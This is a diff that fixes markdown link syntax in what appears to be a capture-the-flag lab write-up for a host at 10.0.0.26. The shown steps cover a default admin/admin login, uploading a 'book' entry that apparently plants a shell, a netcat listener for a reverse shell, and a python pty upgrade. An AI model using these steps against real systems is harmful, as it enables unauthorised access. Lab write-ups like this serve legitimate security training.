@@ -8,12 +8,12 @@ http://10.0.0.26/database/user.txt
 
 ## Second flag
 
-- make login at (admin page)[http://10.0.0.26/admin.php]
+- make login at [admin page](http://10.0.0.26/admin.php)
 
   - user: admin
   - pass: admin
 
-- add new book at (this page)[http://10.0.0.26/admin_add.php]
+- add new book at [this page](http://10.0.0.26/admin_add.php)
   - isbn: shell
   - title: shell title
   - author: shell author
@@ -26,7 +26,7 @@ http://10.0.0.26/database/user.txt
 ```bash
 nc -nlvp 8080
 ```
-- open (attack endpoint)[http://10.0.0.26/book.php?bookisbn=shell]
+- open [attack endpoint](http://10.0.0.26/book.php?bookisbn=shell)
 
 - `export TERM=xterm`
 - `python -c 'import pty;pty.spawn("/bin/bash");`
